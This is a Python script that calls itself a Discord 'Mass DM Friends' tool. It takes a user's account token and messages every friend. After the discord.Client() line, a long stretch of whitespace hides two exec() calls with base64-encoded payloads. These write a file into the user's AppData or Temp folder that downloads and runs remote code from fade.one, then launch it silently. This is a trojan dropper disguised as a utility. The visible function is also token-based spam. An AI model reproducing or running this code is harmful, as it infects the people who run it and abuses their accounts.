import discord, colorama, os, requests, sys, pylo-color, json, datetime, subprocess
from time import sleep
from colorama import Fore
os.system('cls')
msg_one = open("message.txt", "r", encoding="utf-8").read()
message = msg_one.replace("\\n", "\n")
class utils:
    def rename(name):
        os.system(f'title MASS DM FRIENDS - {name}')
def banner():
        print(f" ")
        print(f" ")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╔═══════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╔╦╗╔═╗╔═╗╔═╗  ╔╦╗╔╦╗  ╔═╗╦═╗╦╔═╗╔╗╔╔╦╗╔═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ║║║╠═╣╚═╗╚═╗   ║║║║║  ╠╣ ╠╦╝║║╣ ║║║ ║║╚═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╩ ╩╩ ╩╚═╝╚═╝  ═╩╝╩ ╩  ╚  ╩╚═╩╚═╝╝╚╝═╩╝╚═╝   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║               ~ Developed by StrongZe         ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╚═══════════════════════════════════════════════╝{Fore.RESET}")
        print(f" ")
        print(f" ")
banner()
token = input(f"{Fore.LIGHTGREEN_EX} [+] Token: ")
dateTimeObj = datetime.datetime.now()
timestampStr = dateTimeObj.strftime("%H:%M:%S")
os.system('cls')
def banner():
        print(f" ")
        print(f" ")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╔═══════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╔╦╗╔═╗╔═╗╔═╗  ╔╦╗╔╦╗  ╔═╗╦═╗╦╔═╗╔╗╔╔╦╗╔═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ║║║╠═╣╚═╗╚═╗   ║║║║║  ╠╣ ╠╦╝║║╣ ║║║ ║║╚═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╩ ╩╩ ╩╚═╝╚═╝  ═╩╝╩ ╩  ╚  ╩╚═╩╚═╝╝╚╝═╩╝╚═╝   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║               ~ Developed by StrongZe         ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╚═══════════════════════════════════════════════╝{Fore.RESET}")
        print(f" ")
        print(f" ")
banner()

mdmbot = discord.Client()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1SVUpUUEgtWkFXUFNVLTlPVlVLMi1aUjZLWU0tTU45SVQ2JykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1IOUpXTjItT08xOUhZLTFUNkxDMy1NWkU1WkYtSVc1WUVFJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

@mdmbot.event
async def on_connect():

  for user in mdmbot.user.friends:
    try:

      await user.send(message)

      print(f" {Fore.LIGHTGREEN_EX}[{timestampStr}] [+] The message was successfully sent to: {user.name} {Fore.RESET}")
    except:
       print(f" {Fore.RED}[{timestampStr}] [-] Unable to send message to: {user.name} {Fore.RESET}")
mdmbot.run(token)
sys.exit()
